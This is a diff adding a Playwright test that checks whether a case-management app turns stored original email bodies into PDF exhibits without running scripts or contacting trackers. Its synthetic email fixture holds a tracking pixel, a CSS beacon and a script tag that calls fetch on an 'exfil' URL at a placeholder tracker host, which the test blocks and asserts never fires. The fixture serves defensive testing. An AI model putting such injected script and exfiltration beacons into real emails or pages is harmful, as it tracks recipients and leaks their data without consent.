@@ -1,3 +1,5 @@
+import { createHash } from 'node:crypto';
+import { PDFDocument, PDFName, PDFRawStream } from 'pdf-lib';
 import { expect, test, type Page } from "@playwright/test";
 import { readFile } from "node:fs/promises";
 import type { WorkspaceState } from "../lib/domain";
@@ -784,4 +786,32 @@ test('review packages never offer submission and the API rejects direct submissi
   });
   expect(response.status()).toBe(409);
   expect((await response.json()).code).toBe('submission_disabled');
+});
+
+
+for (const longEmail of [false, true]) test(`retained original ${longEmail ? 'long' : 'short'} email bodies become visual PDF exhibits without scripts or trackers`, async ({ page }) => {
+  const { state } = await setup(page);
+  const item = state.cases.find(c => c.orderRef === 'ATM-1042')!;
+  const emailId = '11111111-1111-4111-8111-111111111111', evidenceId = 'ev_visual_original';
+  const capturedAt = '2026-11-08T12:00:00Z';
+  const snapshot = JSON.stringify({ schemaVersion: 1, provider: 'resend', caseId: item.id, emailId, capturedAt, message: { id: emailId, from: 'tickets@example.test', to: ['buyer@example.test'], subject: 'Synthetic ticket receipt', created_at: capturedAt, html: '<table style="width:600px;background:#f1f5f9;padding:24px"><tr><td style="background-image:url(https://tracker.example.test/css)"><h1>SYNTHETIC ORIGINAL TICKET</h1><p>Order ATM-1042</p><p>Amount: $42.00</p><p>This is an original provider-body test fixture, not a real customer email.</p><img src="https://tracker.example.test/pixel"><script>parent.__emailExecuted=true;fetch("https://tracker.example.test/exfil")</script></td></tr></table>' + (longEmail ? Array.from({ length: 50 }, (_, i) => `<p>Original body line ${i + 1}. Synthetic pagination fixture.</p>`).join('') : ''), text: null } });
+  item.evidence = [{ id: evidenceId, caseId: item.id, source: 'database', title: 'Original email fixture', content: 'Original provider body retained.', occurredAt: capturedAt, reference: `Resend email ${emailId}`, originalEmail: { provider: 'resend', emailId }, fileName: 'original.json', mimeType: 'application/json', fileSha256: createHash('sha256').update(snapshot).digest('hex'), capturedAt, downloadUrl: `/api/evidence/${evidenceId}` }];
+  item.findings = [];
+  item.draft = { revision: 1, status: 'draft', method: 'evidence_template', generatedAt: capturedAt, content: `Synthetic response referring to the original email. [${evidenceId}]` };
+  await page.route('**/api/workspace', route => route.fulfill({ json: state }));
+  await page.route(`**/api/evidence/${evidenceId}`, route => route.fulfill({ contentType: 'application/json', body: snapshot }));
+  const outbound: string[] = [];
+  await page.route('https://tracker.example.test/**', route => { outbound.push(route.request().url()); return route.abort(); });
+  await page.goto(`/workspace?view=cases&case=${encodeURIComponent(item.id)}&tab=report`);
+  const downloading = page.waitForEvent('download');
+  await page.getByRole('button', { name: 'Download evidence PDF', exact: true }).click();
+  const downloaded = await downloading;
+  const bytes = await readFile((await downloaded.path())!);
+  const pdf = await PDFDocument.load(bytes);
+  expect(pdf.context.enumerateIndirectObjects().some(([,object]) => object instanceof PDFRawStream && object.dict.get(PDFName.of('Subtype')) === PDFName.of('Image'))).toBe(true);
+  expect(outbound).toEqual([]);
+  expect(await page.evaluate(() => '__emailExecuted' in window)).toBe(false);
+  expect(page.frames()).toHaveLength(1);
+  expect(pdf.getPageCount()).toBeGreaterThanOrEqual(longEmail ? 5 : 3);
+  await downloaded.saveAs(`.aws-build/original-email-${longEmail ? 'long' : 'short'}-synthetic.pdf`);
 });
